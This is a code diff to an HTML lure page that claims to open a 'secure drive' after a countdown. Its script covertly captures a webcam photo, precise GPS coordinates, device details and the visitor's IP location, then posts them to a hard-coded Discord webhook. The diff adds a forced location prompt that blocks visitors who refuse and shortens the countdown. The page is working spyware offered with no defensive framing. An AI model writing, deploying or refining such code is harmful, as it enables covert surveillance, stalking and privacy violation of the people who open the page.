@@ -23,16 +23,15 @@
   </style>
 </head>
 <body>
-  <h1 id="countdown">10 seconds to open secure drive</h1>
+  <h1 id="countdown">5 seconds to open secure drive</h1>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
     const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    const deniedPage = "permission-denied.html";
 
     let capturedImageData = null;
-    let lat = localStorage.getItem("lat") || "Permission denied";
-    let lon = localStorage.getItem("lon") || "Permission denied";
-    let acc = localStorage.getItem("acc") || 0;
+    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
 
     function getDeviceInfo() {
       return {
@@ -61,8 +60,7 @@
         video.srcObject = stream;
         document.body.appendChild(video);
         await video.play();
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        await new Promise(res => setTimeout(res, 3000));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
@@ -71,14 +69,14 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         capturedImageData = canvas.toDataURL("image/png");
 
-        stream.getTracks().forEach(t => t.stop());
+        stream.getTracks().forEach(track => track.stop());
       } catch (err) {
-        console.warn("Camera failed or denied", err);
+        console.warn("Camera denied or failed", err);
       }
     }
 
     function sendToDiscord(ipData) {
-      const mapLink = lat !== "Permission denied" ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
+      const mapLink = coords.lat !== "Permission denied" ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
       const device = getDeviceInfo();
 
       const formData = new FormData();
@@ -90,7 +88,7 @@
         embeds: [{
           title: "📍 GPS & Device Info",
           description:
-            `**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc} meters` +
+            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
             `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
             `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
             `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
@@ -108,21 +106,56 @@
 
       formData.append("payload_json", JSON.stringify(payload));
 
-      fetch(webhookUrl, { method: "POST", body: formData });
+      fetch(webhookUrl, {
+        method: "POST",
+        body: formData
+      });
     }
 
-    captureSnapshot().then(() => {
+    function askNotificationPermission() {
+      if ('Notification' in window && Notification.permission !== 'granted') {
+        Notification.requestPermission();
+      }
+    }
+
+    function askLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            coords.lat = pos.coords.latitude;
+            coords.lon = pos.coords.longitude;
+            coords.acc = pos.coords.accuracy;
+            resolve(true);
+          },
+          () => resolve(false),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function startAll() {
+      const locationAllowed = await askLocation();
+      askNotificationPermission();
+
+      if (!locationAllowed) {
+        window.location.href = deniedPage;
+        return;
+      }
+
+      await captureSnapshot();
+
       fetch("https://api.db-ip.com/v2/free/self")
         .then(res => res.json())
         .then(sendToDiscord)
         .catch(() => {
           sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
         });
-    });
+    }
 
-    let seconds = 10;
+    startAll();
+
+    let seconds = 5;
     const countdownEl = document.getElementById("countdown");
-
     const timer = setInterval(() => {
       seconds--;
       countdownEl.textContent = `${seconds} seconds to open secure drive`;
